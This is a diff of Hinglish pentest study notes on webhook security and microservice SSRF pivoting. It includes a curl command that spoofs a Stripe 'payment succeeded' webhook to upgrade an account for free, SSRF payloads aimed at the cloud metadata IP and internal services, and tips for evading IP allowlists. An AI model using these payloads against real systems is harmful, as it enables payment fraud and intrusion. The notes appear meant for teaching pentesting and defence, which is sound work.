+* **✅ Kab use karo (Use in engagement when):** Jab target application kisi third-party payment gateway (Stripe, PayPal), CI/CD pipeline (GitHub actions), ya SMS service (Twilio) se integrate ho, aur unka **callback URL** (endpoint jahan third-party data bhejti hai) discover ho jaye.
+* **❌ Kab mat karo / Alternative prefer karo:** Agar target properly `X-Hub-Signature` (HTTP header jo signature carry karta hai) validate kar raha hai aur tumhare paas secret key nahi hai, toh direct spoofing kaam nahi karegi. Tab **Replay attacks** (purani valid request ko baar-baar bhejna) try karo.
 
-[[HL::### 🔍 5. Visual / Terminal Mein Kya Dikhega::HL]]
+### 🔍 5. Visual / Terminal Mein Kya Dikhega
 
-[[HL::Burp Suite Repeater mein tum ek POST request target ke `/api/webhook/stripe` par bhejoge fake payload ke saath, aur response mein `200 OK` aayega jiska matlab target ne fake payment accept kar li hai.::HL]]
+Burp Suite Repeater mein tum ek POST request target ke `/api/webhook/stripe` par bhejoge fake payload ke saath, aur response mein `200 OK` aayega jiska matlab target ne fake payment accept kar li hai.
 
-[[HL::### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)::HL]]
+### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)
 
-[[HL::(1) **Reconnaissance:** Attacker API docs ya JS files se Webhook endpoint dhoondhta hai -> (2) **Payload Crafting:** Attacker fake JSON payload banata hai claiming status="paid" -> (3) **Spoofing:** Request seedha target ke webhook URL par bheji jati hai -> (4) **Server Processing:** Target server (kyunki signature validation absent hai) request ko valid maan leta hai -> (5) **Action:** Database mein attacker ka account "Premium" mark ho jata hai.::HL]]
+(1) **Reconnaissance:** Attacker API docs ya JS files se Webhook endpoint dhoondhta hai -> (2) **Payload Crafting:** Attacker fake JSON payload banata hai claiming status="paid" -> (3) **Spoofing:** Request seedha target ke webhook URL par bheji jati hai -> (4) **Server Processing:** Target server (kyunki signature validation absent hai) request ko valid maan leta hai -> (5) **Action:** Database mein attacker ka account "Premium" mark ho jata hai.
 
-[[HL::### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)::HL]]
+### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)
 
-#### [[HL::🛠️ Step-by-Step GUI Navigation (Burp Suite & Webhook.site)::HL]]
+#### 🛠️ Step-by-Step GUI Navigation (Burp Suite & Webhook.site)
 
-[[HL::1. **Webhook.site** (free service jo incoming HTTP requests capture karti hai) pe jao aur ek temporary URL generate karo.::HL]]
-[[HL::2. Target application ki profile settings mein jahan webhook add karne ka option ho (jaise "Send notifications to"), wahan yeh URL daalo.::HL]]
-[[HL::3. Target app mein koi action karo (e.g., payment initiate) aur Webhook.site pe dekho kaisa JSON structure aata hai.::HL]]
-[[HL::4. **Burp Suite** mein jao, Target ke actual webhook endpoint (`/api/webhook`) par request craft karo.::HL]]
-[[HL::5. JSON body mein `amount` aur `status` modify karo. **Signature headers (jaise Stripe-Signature) remove kar do.**::HL]]
-[[HL::6. Request Send karo aur dekho kya 200 OK aata hai.::HL]]
+1. **Webhook.site** (free service jo incoming HTTP requests capture karti hai) pe jao aur ek temporary URL generate karo.
+2. Target application ki profile settings mein jahan webhook add karne ka option ho (jaise "Send notifications to"), wahan yeh URL daalo.
+3. Target app mein koi action karo (e.g., payment initiate) aur Webhook.site pe dekho kaisa JSON structure aata hai.
+4. **Burp Suite** mein jao, Target ke actual webhook endpoint (`/api/webhook`) par request craft karo.
+5. JSON body mein `amount` aur `status` modify karo. **Signature headers (jaise Stripe-Signature) remove kar do.**
+6. Request Send karo aur dekho kya 200 OK aata hai.
 
-[[HL::#### 🔬 Attack Command (cURL Webhook Spoofing)::HL]]
+#### 🔬 Attack Command (cURL Webhook Spoofing)
 
-[[HL::```bash::HL]]
-[[HL::# Kali Linux | cURL 7.81+::HL]]
-[[HL::1  curl -X POST https://target.com/api/webhook/stripe \  # curl = HTTP requests bhejne ka CLI tool; -X POST = HTTP POST method use karo; target URL webhook endpoint hai::HL]]
-[[HL::2    -H "Content-Type: application/json" \               # -H = Header add karo; JSON format batao::HL]]
-[[HL::3    -d '{                                               # -d = data (payload body)::HL]]
-[[HL::4      "id": "evt_test123",                              # id = fake event ID::HL]]
-[[HL::5      "type": "payment_intent.succeeded",               # type = event type jo bata raha hai payment ho gayi::HL]]
-[[HL::6      "data": {                                         # data = nested object::HL]]
-[[HL::7        "object": {                                     # object = payment details::HL]]
-[[HL::8          "customer_email": "attacker@evil.com",        # customer_email = attacker ka email account upgrade karne ke liye::HL]]
-[[HL::9          "amount": 9900,                               # amount = $99.00::HL]]
-[[HL::10         "status": "succeeded"                         # status = successfully paid::HL]]
-[[HL::11       }::HL]]
-[[HL::12     }::HL]]
-[[HL::13   }'::HL]]
+```bash
+# Kali Linux | cURL 7.81+
+1  curl -X POST https://target.com/api/webhook/stripe \  # curl = HTTP requests bhejne ka CLI tool; -X POST = HTTP POST method use karo; target URL webhook endpoint hai
+2    -H "Content-Type: application/json" \               # -H = Header add karo; JSON format batao
+3    -d '{                                               # -d = data (payload body)
+4      "id": "evt_test123",                              # id = fake event ID
+5      "type": "payment_intent.succeeded",               # type = event type jo bata raha hai payment ho gayi
+6      "data": {                                         # data = nested object
+7        "object": {                                     # object = payment details
+8          "customer_email": "attacker@evil.com",        # customer_email = attacker ka email account upgrade karne ke liye
+9          "amount": 9900,                               # amount = $99.00
+10         "status": "succeeded"                         # status = successfully paid
+11       }
+12     }
+13   }'
 
-[[HL::```::HL]]
+```
 
-[[HL::```::HL]]
-[[HL::# 📤 Expected Output:::HL]]
-[[HL::{"status": "success", "message": "Payment processed and account upgraded."}::HL]]
+```
+# 📤 Expected Output:
+{"status": "success", "message": "Payment processed and account upgraded."}
 
-[[HL::```::HL]]
+```
 
-[[HL::*🔬 Code Explanation:*::HL]]
+*🔬 Code Explanation:*
 
-[[HL::* **Line 1-3:** Hum directly target ke backend endpoint par request bhej rahe hain (as if hum Stripe server hain).::HL]]
-[[HL::* **Line 5 & 10:** Yahan hum API ko trick kar rahe hain yeh bol kar ki payment successful ho chuki hai. Agar backend ne cryptographic signature verify nahi kiya, toh yeh bypass ho jayega.::HL]]
+* **Line 1-3:** Hum directly target ke backend endpoint par request bhej rahe hain (as if hum Stripe server hain).
+* **Line 5 & 10:** Yahan hum API ko trick kar rahe hain yeh bol kar ki payment successful ho chuki hai. Agar backend ne cryptographic signature verify nahi kiya, toh yeh bypass ho jayega.
 
-[[HL::### 🔒 8. Attack Surface & Defense (Dual Perspective)::HL]]
+### 🔒 8. Attack Surface & Defense (Dual Perspective)
 
-[[HL::**🔴 Attacker Perspective (Red Team):**::HL]]
+**🔴 Attacker Perspective (Red Team):**
 
-[[HL::* Attacker fake events bhejkar **payment bypass** karta hai.::HL]]
-[[HL::* Agar target webhook configuration panel mein URL input leta hai (e.g., "Enter your webhook URL"), toh attacker **SSRF via webhooks** (Server-Side Request Forgery — server ko force karna internal network se connect karne ke liye) try karega. Attacker URL mein `http://169.254.169.254` (cloud metadata IP) daal kar **blind SSRF** (jab response frontend pe na dikhe par server hit kare) exploit kar sakta hai.::HL]]
-[[HL::* Agar signature check hai par timestamps nahi hain, toh attacker purani request capture karke baar-baar bhejega (**Replay attacks**).::HL]]
+* Attacker fake events bhejkar **payment bypass** karta hai.
+* Agar target webhook configuration panel mein URL input leta hai (e.g., "Enter your webhook URL"), toh attacker **SSRF via webhooks** (Server-Side Request Forgery — server ko force karna internal network se connect karne ke liye) try karega. Attacker URL mein `http://169.254.169.254` (cloud metadata IP) daal kar **blind SSRF** (jab response frontend pe na dikhe par server hit kare) exploit kar sakta hai.
+* Agar signature check hai par timestamps nahi hain, toh attacker purani request capture karke baar-baar bhejega (**Replay attacks**).
 
-[[HL::**🔵 Defender Perspective (Blue Team):**::HL]]
+**🔵 Defender Perspective (Blue Team):**
 
-[[HL::* Webhook endpoints pe hamesha secret token ya HMAC signatures verify karo (`X-Hub-Signature` header check karo).::HL]]
-[[HL::* Replay attacks prevent karne ke liye payload mein timestamp check karo (e.g., request 5 minute se purani nahi honi chahiye).::HL]]
-[[HL::* SSRF prevent karne ke liye user-supplied webhook URLs ko strict allowlist ya internal network blocklist se pass karo.::HL]]
+* Webhook endpoints pe hamesha secret token ya HMAC signatures verify karo (`X-Hub-Signature` header check karo).
+* Replay attacks prevent karne ke liye payload mein timestamp check karo (e.g., request 5 minute se purani nahi honi chahiye).
+* SSRF prevent karne ke liye user-supplied webhook URLs ko strict allowlist ya internal network blocklist se pass karo.
 
-[[HL::### 🌍 9. Real-World Penetration Testing Use-Case::HL]]
+### 🌍 9. Real-World Penetration Testing Use-Case
 
-[[HL::Bug bounty programs mein payment gateways (Stripe, Razorpay) ke integrations check karna ek high-severity vector hai. Agar tum e-commerce site pe payment initiate karo, aur payment gateway tab band karke, Burp se manually `/webhook/razorpay` pe success ka payload bhej do — aur order confirm ho jaye — toh yeh Critical (P1) finding hai. E-commerce site ne signature check enforce nahi kiya tha.::HL]]
+Bug bounty programs mein payment gateways (Stripe, Razorpay) ke integrations check karna ek high-severity vector hai. Agar tum e-commerce site pe payment initiate karo, aur payment gateway tab band karke, Burp se manually `/webhook/razorpay` pe success ka payload bhej do — aur order confirm ho jaye — toh yeh Critical (P1) finding hai. E-commerce site ne signature check enforce nahi kiya tha.
 
-[[HL::### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)::HL]]
+### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)
 
-[[HL::* **❌ Mistake:** Webhook payload ke JSON format mein syntax errors karna.::HL]]
-[[HL::* **🤦 Why:** Beginners copy-paste karte waqt quotes ya commas miss kar dete hain jisse server parsing error deta hai, aur unhe lagta hai webhook secure hai.::HL]]
-[[HL::* **✅ The 'Pro' Way:** Intercept ki hui genuine request lo, aur sirf values change karo bina format tode.::HL]]
-[[HL::* **⚡ Consequences:** Galat format se 500 Internal Server Error aayega, false negative finding ho jayegi.::HL]]
-[[HL::* **❌ Mistake:** IP whitelisting dekh kar haar maan lena.::HL]]
-[[HL::* **🤦 Why:** Agar backend sirf Stripe ke IPs allow kar raha hai, toh log sochte hain spoofing impossible hai.::HL]]
-[[HL::* **✅ The 'Pro' Way:** IP spoofing headers (`X-Forwarded-For: <Stripe-IP>`) try karo ya SSRF use karke same network se request trigger karwao.::HL]]
-[[HL::* **⚡ Consequences:** High-impact vulnerability miss ho jayegi.::HL]]
+* **❌ Mistake:** Webhook payload ke JSON format mein syntax errors karna.
+* **🤦 Why:** Beginners copy-paste karte waqt quotes ya commas miss kar dete hain jisse server parsing error deta hai, aur unhe lagta hai webhook secure hai.
+* **✅ The 'Pro' Way:** Intercept ki hui genuine request lo, aur sirf values change karo bina format tode.
+* **⚡ Consequences:** Galat format se 500 Internal Server Error aayega, false negative finding ho jayegi.
+* **❌ Mistake:** IP whitelisting dekh kar haar maan lena.
+* **🤦 Why:** Agar backend sirf Stripe ke IPs allow kar raha hai, toh log sochte hain spoofing impossible hai.
+* **✅ The 'Pro' Way:** IP spoofing headers (`X-Forwarded-For: <Stripe-IP>`) try karo ya SSRF use karke same network se request trigger karwao.
+* **⚡ Consequences:** High-impact vulnerability miss ho jayegi.
 
-[[HL::### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)::HL]]
+### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)
 
-* [[HL::**Confusion 1 — "Webhook aur API Polling mein kya farq hai?"**::HL]]
-* [[HL::**Galat soch:** Dono same tarike se data fetch karte hain.::HL]]
-* [[HL::**Actually:** Polling mein tumhara server baar-baar poochta hai "kya payment hui?". Webhooks **asynchronous** (event-driven, bina wait kiye background me chalne wala) hote hain — third-party khud batati hai "payment ho gayi".::HL]]
-[[HL::* **Prove karo:** Network tab mein dekho. Polling mein har 5 second mein GET request jayegi. Webhook mein sirf ek POST request aayegi jab event trigger hoga.::HL]]
+* **Confusion 1 — "Webhook aur API Polling mein kya farq hai?"**
+* **Galat soch:** Dono same tarike se data fetch karte hain.
+* **Actually:** Polling mein tumhara server baar-baar poochta hai "kya payment hui?". Webhooks **asynchronous** (event-driven, bina wait kiye background me chalne wala) hote hain — third-party khud batati hai "payment ho gayi".
+* **Prove karo:** Network tab mein dekho. Polling mein har 5 second mein GET request jayegi. Webhook mein sirf ek POST request aayegi jab event trigger hoga.
 
 
-[[HL::* **Confusion 2 — "Blind SSRF aur regular SSRF mein webhook context mein kya farq hai?"**::HL]]
-[[HL::* **Galat soch:** Dono mein AWS metadata screen pe dikh jayega.::HL]]
-[[HL::* **Actually:** Webhook panels usually backend mein fire and forget hote hain. Regular SSRF mein response tumhari screen pe aayega. Blind SSRF mein request jayegi par tumhe response nahi dikhega.::HL]]
-[[HL::* **Prove karo:** Webhook URL mein apna Burp Collaborator link daalo. Agar wahan ping aata hai par website pe kuch nahi dikhta, toh yeh Blind SSRF hai.::HL]]
+* **Confusion 2 — "Blind SSRF aur regular SSRF mein webhook context mein kya farq hai?"**
+* **Galat soch:** Dono mein AWS metadata screen pe dikh jayega.
+* **Actually:** Webhook panels usually backend mein fire and forget hote hain. Regular SSRF mein response tumhari screen pe aayega. Blind SSRF mein request jayegi par tumhe response nahi dikhega.
+* **Prove karo:** Webhook URL mein apna Burp Collaborator link daalo. Agar wahan ping aata hai par website pe kuch nahi dikhta, toh yeh Blind SSRF hai.
 
 
 
-[[HL::### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)::HL]]
+### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)
 
-[[HL::* **`Error: 400 Bad Request (Invalid JSON)`**::HL]]
-[[HL::* **Root Cause:** Payload craft karte waqt JSON syntax toot gaya (missing comma/bracket).::HL]]
-[[HL::* **Fix:** Payload ko kisi online JSON validator mein check karo aur phir Burp mein paste karo.::HL]]
+* **`Error: 400 Bad Request (Invalid JSON)`**
+* **Root Cause:** Payload craft karte waqt JSON syntax toot gaya (missing comma/bracket).
+* **Fix:** Payload ko kisi online JSON validator mein check karo aur phir Burp mein paste karo.
 
 
-[[HL::* **`Error: 401 Unauthorized ya 403 Forbidden`**::HL]]
-[[HL::* **Root Cause:** Backend HMAC signature enforce kar raha hai.::HL]]
-[[HL::* **Fix:** Tum signature bina secret key ke forge nahi kar sakte. Replay attack try karo (valid signature wali purani request dobara bhejo).::HL]]
+* **`Error: 401 Unauthorized ya 403 Forbidden`**
+* **Root Cause:** Backend HMAC signature enforce kar raha hai.
+* **Fix:** Tum signature bina secret key ke forge nahi kar sakte. Replay attack try karo (valid signature wali purani request dobara bhejo).
 
 
-[[HL::* **`Symptom: 200 OK aaya par account upgrade nahi hua`**::HL]]
-[[HL::* **Root Cause:** API JSON process kar rahi hai par payment ID database mein exist nahi karti.::HL]]
-[[HL::* **Fix:** Pehle ek legit ₹1 ki payment initiate karo system mein, uski genuine ID note karo, aur spoofed webhook mein us ID ko status="paid" ke sath bhejo.::HL]]
+* **`Symptom: 200 OK aaya par account upgrade nahi hua`**
+* **Root Cause:** API JSON process kar rahi hai par payment ID database mein exist nahi karti.
+* **Fix:** Pehle ek legit ₹1 ki payment initiate karo system mein, uski genuine ID note karo, aur spoofed webhook mein us ID ko status="paid" ke sath bhejo.
 
 
 
-[[HL::### ⚖️ 13. Comparison (Webhook Spoofing vs SSRF via Webhooks)::HL]]
+### ⚖️ 13. Comparison (Webhook Spoofing vs SSRF via Webhooks)
 
-[[HL::| Feature | Webhook Spoofing | SSRF via Webhooks |::HL]]
-[[HL::| --- | --- | --- |::HL]]
-[[HL::| **Target Mechanism** | API ka incoming data consumer logic | API ka outgoing HTTP client |::HL]]
-[[HL::| **Attacker Goal** | Business logic bypass (e.g., fake payment) | Internal network pivot, metadata extraction |::HL]]
-[[HL::| **Payload Location** | Request body (fake event data) | Webhook URL input field |::HL]]
+| Feature | Webhook Spoofing | SSRF via Webhooks |
+| --- | --- | --- |
+| **Target Mechanism** | API ka incoming data consumer logic | API ka outgoing HTTP client |
+| **Attacker Goal** | Business logic bypass (e.g., fake payment) | Internal network pivot, metadata extraction |
+| **Payload Location** | Request body (fake event data) | Webhook URL input field |
 
-[[HL::### 🔄 14. Kill Chain & Attack Phase Flow::HL]]
+### 🔄 14. Kill Chain & Attack Phase Flow
 
-[[HL::* **⚔️ Attack Phase:** Exploitation::HL]]
-[[HL::* **📍 Kill Chain Position:** Delivery & Exploitation phase. Attacker target system mein malicious logic inject karta hai.::HL]]
-[[HL::* **🔗 This connects to:** Business Logic Abuse, Bypassing Authentication.::HL]]
-[[HL::* **🔄 Flow:** Recon (API docs se `/api/webhook` dhoondho) -> Weaponization (Fake JSON construct karo) -> Exploitation (Signature header hata ke request bhejo) -> Objective (Account status change).::HL]]
+* **⚔️ Attack Phase:** Exploitation
+* **📍 Kill Chain Position:** Delivery & Exploitation phase. Attacker target system mein malicious logic inject karta hai.
+* **🔗 This connects to:** Business Logic Abuse, Bypassing Authentication.
+* **🔄 Flow:** Recon (API docs se `/api/webhook` dhoondho) -> Weaponization (Fake JSON construct karo) -> Exploitation (Signature header hata ke request bhejo) -> Objective (Account status change).
 
-[[HL::### 🎨 15. Visual Diagram (ASCII Art — Webhook Spoofing Flow)::HL]]
+### 🎨 15. Visual Diagram (ASCII Art — Webhook Spoofing Flow)
 
-[[HL::```text::HL]]
-[[HL::[Normal Flow]::HL]]
-[[HL::Stripe Server -----> (Valid Signature + Payload) -----> Target API (200 OK, Order Placed)::HL]]
+```text
+[Normal Flow]
+Stripe Server -----> (Valid Signature + Payload) -----> Target API (200 OK, Order Placed)
 
-[[HL::[Attacker Flow - Spoofing]::HL]]
-[[HL::Attacker PC  -----> (NO Signature + Fake Payload) ----> Target API (No Check?) --> (200 OK, Order Placed)::HL]]
-[[HL::                        "Payment: Succeeded"::HL]]
+[Attacker Flow - Spoofing]
+Attacker PC  -----> (NO Signature + Fake Payload) ----> Target API (No Check?) --> (200 OK, Order Placed)
+                        "Payment: Succeeded"
 
-[[HL::```::HL]]
+```
 
-[[HL::### ❓ 16. Interview & Certification Exam Q&A::HL]]
+### ❓ 16. Interview & Certification Exam Q&A
 
-[[HL::* **Q: Webhooks mein Replay Attack kya hota hai aur kaise mitigate karein?**::HL]]
-[[HL::* **A:** Replay attack mein attacker ek valid, signed webhook request ko intercept karke baad mein baar-baar bhejta hai (e.g., 1 payment karke 5 baar success request bhejna). Mitigate karne ke liye payloads mein ek timestamp aur unique 'nonce' (number used once) hona chahiye jisse server purani requests reject kar de.::HL]]
+* **Q: Webhooks mein Replay Attack kya hota hai aur kaise mitigate karein?**
+* **A:** Replay attack mein attacker ek valid, signed webhook request ko intercept karke baad mein baar-baar bhejta hai (e.g., 1 payment karke 5 baar success request bhejna). Mitigate karne ke liye payloads mein ek timestamp aur unique 'nonce' (number used once) hona chahiye jisse server purani requests reject kar de.
 
 
-[[HL::* **Q: `X-Hub-Signature` kya hai aur attacker ise bypass kyun nahi kar sakta?**::HL]]
-[[HL::* **A:** Yeh header payload ka HMAC hash contain karta hai jo ek shared secret key se banta hai (jo sirf Stripe aur Target ko pata hai). Bina us secret key ke, attacker fake payload ka valid hash generate nahi kar sakta, isliye spoofing fail ho jati hai agar backend verification enforce kare.::HL]]
+* **Q: `X-Hub-Signature` kya hai aur attacker ise bypass kyun nahi kar sakta?**
+* **A:** Yeh header payload ka HMAC hash contain karta hai jo ek shared secret key se banta hai (jo sirf Stripe aur Target ko pata hai). Bina us secret key ke, attacker fake payload ka valid hash generate nahi kar sakta, isliye spoofing fail ho jati hai agar backend verification enforce kare.
 
 
-[[HL::* **Q: Webhook configuration settings mein SSRF kaise test karoge?**::HL]]
-[[HL::* **A:** Main "Webhook URL" field mein `localhost:80`, `127.0.0.1:22`, ya cloud metadata IP (`169.254.169.254`) input karunga. Agar backend yeh filter nahi karta aur HTTP request trigger kar deta hai internal services pe, toh yeh SSRF vulnerability hai.::HL]]
+* **Q: Webhook configuration settings mein SSRF kaise test karoge?**
+* **A:** Main "Webhook URL" field mein `localhost:80`, `127.0.0.1:22`, ya cloud metadata IP (`169.254.169.254`) input karunga. Agar backend yeh filter nahi karta aur HTTP request trigger kar deta hai internal services pe, toh yeh SSRF vulnerability hai.
 
 
 
-[[HL::### 📝 17. One-Line Memory Hook::HL]]
+### 📝 17. One-Line Memory Hook
 
-[[HL::"Bina HMAC check ke webhook = anjaan aadmi se verbally payment receipt accept karna."::HL]]
+"Bina HMAC check ke webhook = anjaan aadmi se verbally payment receipt accept karna."
 
-[[HL::### 🔑 18. Keywords Coverage Verification::HL]]
+### 🔑 18. Keywords Coverage Verification
 
-[[HL::```text::HL]]
-[[HL::🔑 Keywords Coverage Check — Webhook Security::HL]]
-[[HL::✅ Covered    : Webhooks, event-driven APIs, callback URL, HMAC signature, X-Hub-Signature, replay attacks, fake events, payment bypass, SSRF via webhooks, blind SSRF, asynchronous::HL]]
-[[HL::⚠️ Mentioned but needs more depth : (none)::HL]]
-[[HL::❌ MISSED     : (none)::HL]]
+```text
+🔑 Keywords Coverage Check — Webhook Security
+✅ Covered    : Webhooks, event-driven APIs, callback URL, HMAC signature, X-Hub-Signature, replay attacks, fake events, payment bypass, SSRF via webhooks, blind SSRF, asynchronous
+⚠️ Mentioned but needs more depth : (none)
+❌ MISSED     : (none)
 
-[[HL::```::HL]]
+```
 
-[[HL::> ✅ Verified: 100% keyword coverage achieved for this topic.::HL]]
+> ✅ Verified: 100% keyword coverage achieved for this topic.
 
-[[HL::---::HL]]
+---
 
-[[HL::### ✅ Topic Completion Checklist: Webhook Security::HL]]
+### ✅ Topic Completion Checklist: Webhook Security
 
-[[HL::* [x] Signature Verification::HL]]
-[[HL::* [x] Replay Attacks::HL]]
-[[HL::* [x] SSRF via Webhooks::HL]]
+* [x] Signature Verification
+* [x] Replay Attacks
+* [x] SSRF via Webhooks
 
-[[HL::> ✅ Verified by Notes Guru (Offensive Security Edition). 100% Subtopic Coverage + 100% Keyword Coverage.::HL]]
+> ✅ Verified by Notes Guru (Offensive Security Edition). 100% Subtopic Coverage + 100% Keyword Coverage.
 
-[[HL::---::HL]]
+---
 
-[[HL::### 🎯 2. Microservices Communication Security::HL]]
+### 🎯 2. Microservices Communication Security
 
-[[HL::Is topic mein hum seekhenge ki kaise modern cloud environments mein internal **Microservices** aapas mein bina authentication ke baat karti hain (**Implicit Trust**), aur ek single external vulnerability (jaise SSRF) ka use karke attacker poore internal network mein **lateral movement** (ek machine se dusri machine pe jump karna) kaise karta hai.::HL]]
+Is topic mein hum seekhenge ki kaise modern cloud environments mein internal **Microservices** aapas mein bina authentication ke baat karti hain (**Implicit Trust**), aur ek single external vulnerability (jaise SSRF) ka use karke attacker poore internal network mein **lateral movement** (ek machine se dusri machine pe jump karna) kaise karta hai.
 
-[[HL::### 🐣 2. Simple Analogy (Hinglish)::HL]]
+### 🐣 2. Simple Analogy (Hinglish)
 
-[[HL::Socho ek corporate office building. Main gate pe security bohot strict hai (External API Gateway). Lekin ek baar tum andar ghus gaye, toh 2nd floor se 3rd floor (Microservices) jaane ke liye koi ID card nahi maangta kyunki wahan sab ek dusre ko "trusted employee" maante hain (Implicit Trust). Agar ek chor roshan-daan se andar aa jaye (SSRF vulnerability), toh wo poori building mein aaram se ghoom sakta hai.::HL]]
+Socho ek corporate office building. Main gate pe security bohot strict hai (External API Gateway). Lekin ek baar tum andar ghus gaye, toh 2nd floor se 3rd floor (Microservices) jaane ke liye koi ID card nahi maangta kyunki wahan sab ek dusre ko "trusted employee" maante hain (Implicit Trust). Agar ek chor roshan-daan se andar aa jaye (SSRF vulnerability), toh wo poori building mein aaram se ghoom sakta hai.
 
-[[HL::### 📖 3. Technical Definition::HL]]
+### 📖 3. Technical Definition
 
-[[HL::* **Precise English:** Microservices architecture divides applications into smaller, loosely coupled services. Security flaws arise when these internal services communicate over unauthenticated channels (lacking mTLS) relying purely on network boundaries (implicit trust), allowing attackers who breach the perimeter via SSRF to pivot and attack internal components directly.::HL]]
-[[HL::* **Hinglish Simplification:** Ek badi application chote-chote internal APIs (microservices) mein bati hoti hai. Agar in services ke beech mein strict authentication nahi hai, toh bahar se andar ghusa hua attacker easily in internal services ko direct command de sakta hai.::HL]]
+* **Precise English:** Microservices architecture divides applications into smaller, loosely coupled services. Security flaws arise when these internal services communicate over unauthenticated channels (lacking mTLS) relying purely on network boundaries (implicit trust), allowing attackers who breach the perimeter via SSRF to pivot and attack internal components directly.
+* **Hinglish Simplification:** Ek badi application chote-chote internal APIs (microservices) mein bati hoti hai. Agar in services ke beech mein strict authentication nahi hai, toh bahar se andar ghusa hua attacker easily in internal services ko direct command de sakta hai.
 
-[[HL::### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)::HL]]
+### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)
 
-[[HL::* **Problem:** **Implicit trust** ka matlab hai ki `billing-service` yeh maan legi ki `user-service` se aane wali saari requests genuine hain. Ek baar perimeter break hua, poora network compromise ho jata hai.::HL]]
-[[HL::* **Solution:** **mTLS** (Mutual TLS — jahan client aur server dono ek dusre ko certificates se authenticate karte hain) aur **Zero Trust** (ek security concept jahan internal network mein bhi kisi par bharosa nahi kiya jata, har request verify hoti hai) lagana zaroori hai.::HL]]
-[[HL::* **What breaks if we don't know this?** Tum external web app pe ek chhota sa bug dhoondh ke report kar doge, jabki usi bug (SSRF) se tum backend ke saare servers ka data nikal sakte the.::HL]]
-[[HL::* **✅ Kab use karo (Use in engagement when):** Jab tumhe web app par Server-Side Request Forgery (SSRF) mil jaye aur target application containerized (Docker/Kubernetes) lag rahi ho, tab **internal routing** paths (jaise `http://localhost:8080` ya `http://admin-api`) bruteforce karna zaroori hai.::HL]]
-* **❌ [[HL::Kab mat karo / Alternative::HL]] prefer karo:** Agar internal network strongly mTLS enforced hai, toh external SSRF se internal API access nahi milega kyunki tumhare paas valid client certificate nahi hoga. Tab direct RCE dhoondhne pe focus karo.
+* **Problem:** **Implicit trust** ka matlab hai ki `billing-service` yeh maan legi ki `user-service` se aane wali saari requests genuine hain. Ek baar perimeter break hua, poora network compromise ho jata hai.
+* **Solution:** **mTLS** (Mutual TLS — jahan client aur server dono ek dusre ko certificates se authenticate karte hain) aur **Zero Trust** (ek security concept jahan internal network mein bhi kisi par bharosa nahi kiya jata, har request verify hoti hai) lagana zaroori hai.
+* **What breaks if we don't know this?** Tum external web app pe ek chhota sa bug dhoondh ke report kar doge, jabki usi bug (SSRF) se tum backend ke saare servers ka data nikal sakte the.
+* **✅ Kab use karo (Use in engagement when):** Jab tumhe web app par Server-Side Request Forgery (SSRF) mil jaye aur target application containerized (Docker/Kubernetes) lag rahi ho, tab **internal routing** paths (jaise `http://localhost:8080` ya `http://admin-api`) bruteforce karna zaroori hai.
+* **❌ Kab mat karo / Alternative prefer karo:** Agar internal network strongly mTLS enforced hai, toh external SSRF se internal API access nahi milega kyunki tumhare paas valid client certificate nahi hoga. Tab direct RCE dhoondhne pe focus karo.
 
-[[HL::### 🔍 5. Visual / Terminal Mein Kya Dikhega::HL]]
+### 🔍 5. Visual / Terminal Mein Kya Dikhega
 
-[[HL::Burp Repeater mein SSRF parameter ke andar tum `url=http://billing-service:8080/users` daaloge, aur response mein tumhe database ke saare internal users ka JSON data dikh jayega bina kisi Authorization token ke.::HL]]
+Burp Repeater mein SSRF parameter ke andar tum `url=http://billing-service:8080/users` daaloge, aur response mein tumhe database ke saare internal users ka JSON data dikh jayega bina kisi Authorization token ke.
 
-[[HL::### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)::HL]]
+### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)
 
-(1) **External Request:** Attacker public API par SSRF payload bhejta hai -> (2) **API Gateway Bypass:** **API Gateway** (main entry point jo traffic route aur authenticate karta hai) request ko internal network mein process karne bhej deta hai -> (3) **Internal Pivot:** SSRF vulnerable server us request ko aage `[[HL::http://internal-billing-service` pe forward karta hai -> (4) **Implicit Trust Execution:** Billing service bina kisi token ke data return karti hai kyunki request internal network IP se aayi hai -> (5) **Data Exfil:** Data wapas attacker tak pahunch jata hai.::HL]]
+(1) **External Request:** Attacker public API par SSRF payload bhejta hai -> (2) **API Gateway Bypass:** **API Gateway** (main entry point jo traffic route aur authenticate karta hai) request ko internal network mein process karne bhej deta hai -> (3) **Internal Pivot:** SSRF vulnerable server us request ko aage `http://internal-billing-service` pe forward karta hai -> (4) **Implicit Trust Execution:** Billing service bina kisi token ke data return karti hai kyunki request internal network IP se aayi hai -> (5) **Data Exfil:** Data wapas attacker tak pahunch jata hai.
 
-### [[HL::💻 7. Hands-On — Runnable Example (Lab-Ready Commands)::HL]]
+### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)
 
-#### [[HL::🛠️ Step-by-Step GUI Navigation (Burp Suite Repeater)::HL]]
+#### 🛠️ Step-by-Step GUI Navigation (Burp Suite Repeater)
 
-1. [[HL::Burp Suite proxy se ek aisi request pakdo jo external URLs fetch karti ho (e.g., Profile picture upload by URL).::HL]]
-2. [[HL::Request ko `Repeater` mein send karo (`Ctrl+R`).::HL]]
-3. [[HL::Vulnerable parameter (`file=` ya `url=`) mein internal hostname inject karo.::HL]]
-4. [[HL::Hostnames guess/bruteforce karo (Intruder use karke) e.g., `localhost`, `127.0.0.1`, `user-service.local`, `internal-api`.::HL]]
-5. [[HL::Send dabao aur dekho kya internal service bina auth ke data de rahi hai::HL]].
+1. Burp Suite proxy se ek aisi request pakdo jo external URLs fetch karti ho (e.g., Profile picture upload by URL).
+2. Request ko `Repeater` mein send karo (`Ctrl+R`).
+3. Vulnerable parameter (`file=` ya `url=`) mein internal hostname inject karo.
+4. Hostnames guess/bruteforce karo (Intruder use karke) e.g., `localhost`, `127.0.0.1`, `user-service.local`, `internal-api`.
